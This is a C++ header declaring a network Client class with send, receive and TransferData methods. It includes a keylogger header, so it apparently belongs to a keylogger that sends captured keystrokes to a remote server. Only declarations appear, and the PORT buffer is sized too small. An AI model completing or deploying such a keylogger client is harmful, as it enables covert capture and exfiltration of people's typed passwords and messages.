#ifndef client_h
#define client_h

#include <iostream>
#include <string>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "./keylogger/keylogger.h"
//#include "../server/stringProcess.h"

void concatenate(char*& res, const char* buf, int &maxLength);

class Client {
    private:
        int sockfd;
        char IP[20];
        char PORT[5];
        struct addrinfo hints, *serverinfo, *p;
    public:
        Client(char* ip, char* port);
        void* get_in_addr(struct sockaddr *sa);
        bool sending(int sockfd, char* msg);
        int sending(int sockfd, const void* buf, size_t len, int flags);
        bool receive(int sockfd, char*& res, int& maxLength);
        int receive(int sockfd, void* buf, size_t len, int flags);
        void TransferData();
        ~Client();
};

#endif